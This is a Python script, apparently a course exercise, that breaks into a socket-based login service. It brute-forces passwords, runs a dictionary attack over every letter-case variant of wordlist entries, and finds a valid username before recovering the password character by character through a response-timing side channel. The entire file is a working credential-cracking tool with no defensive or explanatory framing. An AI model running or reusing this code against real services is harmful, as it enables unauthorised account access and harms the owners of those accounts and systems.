import sys
import socket
import itertools
import json
from string import ascii_letters, ascii_lowercase, digits
from datetime import datetime, timedelta


def login_json(login_str, passwd_str=' '):
    json_dict = dict(login=login_str, password=passwd_str)
    return json.dumps(json_dict)


def case_combinations(word):
    masks = ('{:0{w}b}'.format(i, w=len(word)) for i in range(2**len(word)))
    return (''.join(
        lower if int(i) else upper for lower, upper, i in zip(
            word.lower(), word.upper(), mask
        )
    ) for mask in masks)


def guesses_iter(all_ascii=False):
    letters = ascii_letters if all_ascii else ascii_lowercase
    n = 1
    while True:
        yield itertools.product(letters + digits, repeat=n)
        n += 1


def guess(only_one=False):
    iterator_of_guesses = guesses_iter(only_one)
    guesses = next(iterator_of_guesses)
    while True:
        try:
            next_guess = next(guesses)
        except StopIteration:
            if only_one:
                yield None
            guesses = next(iterator_of_guesses)
            next_guess = next(guesses)
        yield ''.join(next_guess)


def brute_passwd(socket_client):
    passwd_guesses = guess()
    while True:
        passwd = next(passwd_guesses)
        socket_client.send(passwd.encode())
        response = socket_client.recv(1024)
        if "success" in response.decode():
            break
    return passwd


def brute_file_dict(socket_client, file_path, login_mode=False):
    with open(file_path) as file:
        for line in file:
            credential = line.strip('\n')
            cred_case_combinations = case_combinations(credential)
            for cred_combination in cred_case_combinations:
                if login_mode:
                    socket_client.send(login_json(cred_combination).encode())
                    response = json.loads(socket_client.recv(1024).decode())
                    if "password" in response["result"]:
                        return cred_combination
                else:
                    socket_client.send(cred_combination.encode())
                    response = socket_client.recv(1024)
                    if "success" in response.decode():
                        return cred_combination
    return None


def brute_file_login(socket_client, file_path):
    login = brute_file_dict(socket_client, file_path, login_mode=True)
    passwd_guess = ''
    passwd_chars = guess(only_one=True)
    while True:
        passwd = passwd_guess + next(passwd_chars)
        login_pwd_json = login_json(login, passwd)
        start_timer = datetime.now()
        socket_client.send(login_pwd_json.encode())
        response = json.loads(socket_client.recv(1024).decode())
        response_time = datetime.now() - start_timer
        result = response["result"]
        if "Exception" in result or response_time > timedelta(milliseconds=10):
            passwd_guess = passwd
            passwd_chars = guess(only_one=True)
        elif "success" in result:
            return login_pwd_json


def send_to_server(address, message='', hack_mode=None, file=''):
    with socket.socket() as client:
        client.connect(address)
        if hack_mode == 'brute':
            return brute_passwd(client)
        elif hack_mode == 'dict-passwd' and file:
            return brute_file_dict(client, file)
        elif hack_mode == 'dict-login' and file:
            return brute_file_login(client, file)
        else:
            client.send(message.encode())
            server_response = client.recv(1024)
            return server_response.decode()


cmd_args = sys.argv
hostname = cmd_args[1]
port = int(cmd_args[2])
print(send_to_server((hostname, port),
                     hack_mode='dict-login',
                     file='hacking/logins.txt'))
